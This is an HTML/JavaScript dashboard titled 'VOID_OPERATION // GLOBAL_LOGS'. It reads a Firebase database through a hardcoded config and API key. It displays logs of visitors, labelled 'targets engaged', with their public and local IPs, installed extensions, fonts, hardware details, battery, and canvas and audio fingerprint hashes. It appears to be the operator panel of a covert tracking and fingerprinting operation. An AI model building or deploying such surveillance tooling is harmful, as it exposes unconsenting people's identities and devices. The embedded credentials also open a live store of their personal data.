<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Console</title>
    <style>
        /* --- [ STYLE SECTION ] --- */
        body { 
            font-family: 'Courier New', monospace; 
            background-color: #0c0c0c; 
            color: #00ff41; 
            padding: 20px; 
            margin: 0;
        }
        h1 { 
            border-bottom: 2px solid #00ff41; 
            padding-bottom: 10px; 
            margin-bottom: 20px; 
            text-transform: uppercase; 
            letter-spacing: 2px; 
            font-size: 1.5rem;
        }
        .stat-box { 
            margin-bottom: 20px; 
            font-size: 1.2em; 
            border: 1px solid #333;
            padding: 10px;
            background: #111;
            display: inline-block;
        }
        
        #log-container { 
            height: 80vh; 
            overflow-y: auto; 
            border: 1px solid #333; 
            padding: 10px; 
            background: #000; 
            box-shadow: 0 0 10px rgba(0,255,65,0.1); 
        }
        
        /* Scrollbar Styling */
        #log-container::-webkit-scrollbar { width: 8px; }
        #log-container::-webkit-scrollbar-thumb { background: #00ff41; border-radius: 4px; }
        #log-container::-webkit-scrollbar-track { background: #111; }

        .log-entry { 
            border-bottom: 1px dashed #444; 
            padding: 15px 0; 
            animation: fadeIn 0.3s ease-in; 
        }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        .header-line { 
            font-weight: bold; 
            margin-bottom: 10px; 
            color: #fff; 
            background: #1a1a1a; 
            padding: 5px; 
        }
        .timestamp { color: #00ff41; margin-right: 15px; }

        /* Grid Layout for Data */
        .grid-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
            font-size: 0.85rem;
            color: #ccc;
        }

        .section { margin-bottom: 5px; }
        .section-title { 
            color: #f60; 
            font-weight: bold; 
            text-transform: uppercase; 
            margin-bottom: 5px; 
            display: block; 
            border-bottom: 1px solid #333; 
        }
        
        .data-row { display: flex; justify-content: space-between; margin-bottom: 2px; }
        .label { color: #666; }
        .value { color: #ddd; text-align: right; word-break: break-all; max-width: 65%; }
        
        .alert { color: #ff3333; font-weight: bold; } /* Red for blocked/detected items */
        .highlight { color: #00ff41; }
    </style>
</head>
<body>

    <!-- [ UI SECTION ] -->
    <h1>// VOID_OPERATION // GLOBAL_LOGS</h1>
    
    <div class="stat-box">
        TOTAL TARGETS ENGAGED: <span id="visit-count" style="color:#fff">0</span>
    </div>
    
    <div id="log-container">
        Loading data stream...
    </div>

    <!-- [ LIBRARIES ] -->
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

    <!-- [ LOGIC SECTION ] -->
    <script>
    document.addEventListener('DOMContentLoaded', () => {
        // --- Firebase Config ---
        const firebaseConfig = {
            apiKey: "AIzaSyD19FsJIWCif0h-ExcGODrok4M7wk_bSBc",
            authDomain: "void-81e60.firebaseapp.com",
            databaseURL: "https://void-81e60-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "void-81e60",
            storageBucket: "void-81e60.appspot.com",
            messagingSenderId: "749357378719",
            appId: "1:749357378719:web:6343550759a405e5c1c6aa"
        };

        // Initialize
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        
        const container = document.getElementById('log-container');
        const counter = document.getElementById('visit-count');

        // 1. Live Visit Counter
        db.ref('engagements').on('value', snap => {
            counter.innerText = snap.val() || 0;
        });

        // 2. Live Log Stream
        db.ref('records').limitToLast(50).on('child_added', (snapshot) => {
            // Remove "Loading..." text if present
            if(container.innerHTML.includes('Loading')) container.innerHTML = '';

            const data = snapshot.val();
            const info = data.fullDeviceInfo || {};
            
            const entry = document.createElement('div');
            entry.className = 'log-entry';

            // Helper function to build a data row
            const row = (label, val, isAlert) => `
                <div class="data-row">
                    <span class="label">${label}</span>
                    <span class="value ${isAlert ? 'alert' : ''}">${val || 'N/A'}</span>
                </div>`;

            // HTML Template for the Log Entry
            entry.innerHTML = `
                <div class="header-line">
                    <span class="timestamp">[${data.timestamp}]</span> 
                    IP: <span class="highlight">${data.ip}</span> 
                    ${info.localIP && info.localIP !== 'Hidden' ? `(LAN: ${info.localIP})` : ''}
                </div>
                
                <div class="grid-container">
                    <div class="section">
                        <span class="section-title">Identity & Net</span>
                        ${row('Local IP', info.localIP)}
                        ${row('Referrer', info.referrer)}
                        ${row('Connection', info.connection)}
                        ${row('AdBlock', info.adBlocker, info.adBlocker === 'DETECTED')}
                    </div>

                    <div class="section">
                        <span class="section-title">Software Scan</span>
                        ${row('OS Platform', info.osPlatform)}
                        ${row('OS Fonts', info.osFonts)}
                        ${row('Extensions', info.extensions, info.extensions !== 'None Detected')}
                    </div>

                    <div class="section">
                        <span class="section-title">Hardware ID</span>
                        ${row('GPU', info.gpu ? info.gpu.substring(0,25)+'...' : 'N/A')}
                        ${row('CPU Cores', info.cpu)}
                        ${row('RAM', info.ram)}
                        ${row('Storage Est', info.storage)}
                        ${row('Battery', info.battery)}
                    </div>

                    <div class="section">
                        <span class="section-title">Digital Fingerprints</span>
                        ${row('Canvas Hash', info.canvasHash ? info.canvasHash.substring(0, 15)+'...' : 'N/A')}
                        ${row('Audio Hash', info.audioHash ? info.audioHash.toFixed(8) : 'N/A')}
                        ${row('Screen', info.screen)}
                    </div>
                </div>
            `;

            // Insert new log at the top
            container.insertBefore(entry, container.firstChild);
        });
    });
    </script>
</body>
</html>
